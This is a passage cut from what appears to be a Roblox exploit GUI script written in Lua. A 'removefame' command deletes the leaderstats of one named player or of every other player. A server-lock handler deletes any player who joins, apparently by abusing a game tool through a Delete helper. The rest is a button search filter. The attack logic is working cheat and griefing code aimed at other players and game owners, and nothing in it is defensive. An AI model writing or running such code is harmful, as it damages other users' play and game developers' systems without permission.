				-- Extract the player's name from the textBox.Text
				local half = textBox.Text:match("removefame (%w+)")
				if half == "others" then
					-- Check if a valid player name was extracted
					-- Find the player by name
					--local player = game.Players:WaitForChild(tostring(playerName))
					--print(player.Name)
					local plr = game.Players.LocalPlayer
					-- Check if the player exists
					--if player then
					-- Kick the player
					coroutine.wrap(function()
						local Tool = GetPath()
						local function Task()
							for _, player in pairs(game.Players:GetChildren()) do
								if player.Name == plr.Name then else
									Delete(player:WaitForChild("leaderstats"), Tool)
								end
	
							end
						end
						if Tool.Parent == plr.Backpack then
							Tool.Parent = plr.Character
							wait()
							Task()
							wait()
							Tool.Parent = plr.Backpack
						elseif Tool.Parent == plr.Character then
							Task()
						end	
					end)()
				else
	
					local playerName = FindPlayer(half)
					-- Check if a valid player name was extracted
					-- Find the player by name
					local player = game.Players:WaitForChild(tostring(playerName))
					--print(player.Name)
					local plr = game.Players.LocalPlayer
					-- Check if the player exists
					--if player then
					-- Kick the player
					coroutine.wrap(function()
						local Tool = GetPath()
						local function Task()
							Delete(player:WaitForChild("leaderstats"), Tool)
	
						end
						if Tool.Parent == plr.Backpack then
							Tool.Parent = plr.Character
							wait()
							Task()
							wait()
							Tool.Parent = plr.Backpack
						elseif Tool.Parent == plr.Character then
							Task()
						end	
					end)()
				end
			end
			textBox.Text = ""
		end
	end)
	
	textBox.Changed:Connect(function() -- when the text is changed
		local text = textBox.Text:lower() -- lowercase search bar text
		if text ~= "" then -- if it has text
			local buttons = scroll:GetDescendants() -- all of the buttons
			for _, button in pairs(buttons) do -- loops through the buttons
				if button:IsA("TextButton") then -- if it's a button
					local buttonText = button.Text:lower() -- lowercase button text
					if string.find(buttonText, text) then -- if search bar text is found in the button's text
						--button.TextTransparency = 0
						button.Visible = true -- shows button
					else -- otherwise
	
						--[[coroutine.wrap(function()
	
							button.TextTransparency = .1
							wait()
	
							button.TextTransparency = .2
							wait()
							button.TextTransparency = .3
							wait()
							button.TextTransparency = .4
							wait()
							button.TextTransparency = .5
							wait()
							button.TextTransparency = .6
							wait()
							button.TextTransparency = .7
							wait()
							button.TextTransparency = .8
							wait()
							button.TextTransparency = .9
							wait()]]
						button.Visible = false -- hides button
	
						--end)()
					end
				end
			end
		else -- if it's empty
			local buttons = scroll:GetDescendants() -- all buttons
			for _, button in pairs(buttons) do -- loops through buttons
				if button:IsA("TextButton") then -- if it's a button
					button.Visible = false -- hides button
				end
			end
		end
	--[[	coroutine.wrap(function()
			while wait() do
				if textBox.Text == "" then
					local buttons = scroll:GetDescendants()
					for _, button in pairs(buttons) do -- loops through buttons
						if button:IsA("TextButton") then -- if it's a button
							button.TextTransparency = 0
						end
					end
				end
			end
		end)()]]
	
	end)
	
	
	
	
	
	game.Players.PlayerAdded:Connect(function(player)
		if Slock == true then
			-- Check if a valid player name was extracted
			-- Find the player by name
			--local player = game.Players:WaitForChild(tostring(playerName))
			--print(player.Name)
			local plr = game.Players.LocalPlayer
			-- Check if the player exists
			--if player then
			-- Kick the player
			coroutine.wrap(function()
				local Tool = GetPath()
				local function Task()
					Delete(player, Tool)
				end
				if Tool.Parent == plr.Backpack then
					Tool.Parent = plr.Character
					wait()
					Task()
					wait()
					Tool.Parent = plr.Backpack
				elseif Tool.Parent == plr.Character then
					Task()
				end	
			end)()
		end
	end)
end
coroutine.wrap(TTZT_fake_script)()
